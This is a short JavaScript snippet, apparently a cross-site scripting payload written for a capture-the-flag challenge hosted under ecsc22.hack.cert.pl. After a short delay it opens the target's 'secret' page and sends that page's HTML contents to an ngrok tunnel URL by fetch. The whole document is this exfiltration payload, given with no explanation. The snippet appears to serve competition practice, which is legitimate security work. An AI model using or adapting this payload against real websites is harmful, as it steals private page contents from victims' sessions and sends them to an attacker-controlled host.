setTimeout(() => {
  fetch("https://somehost.eu.ngrok.io/ret?data=" + encodeURIComponent(window.open("https://secret.monster.ecsc22.hack.cert.pl/secret", "secret").document.body.innerHTML));
}, 650);